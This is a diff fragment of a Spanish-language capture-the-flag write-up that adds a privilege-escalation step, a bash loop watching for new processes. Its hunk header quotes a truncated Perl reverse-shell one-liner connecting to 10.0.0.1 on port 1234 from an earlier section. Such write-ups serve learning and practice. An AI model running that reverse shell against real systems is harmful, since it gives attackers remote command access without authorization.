@@ -189,8 +189,20 @@ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 
 Esta es la Ip que nosotros veiamos 172.19.0.3 y en la imagen puedes ver que hay otra de otro segmento escondido para nosotros.
 
+Ahora no se puede hacer nada ni ver la flag asi que necesitamos escalar privilegios usamos:
+```
+#!/bin/bash
+
+old_process=$(ps -eo command)
 
 
+while true; do 
+        new_process=$(ps -eo command)
+        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "command|procmon"
+        old_process=$new_process
+done
+
+```
 
 
 
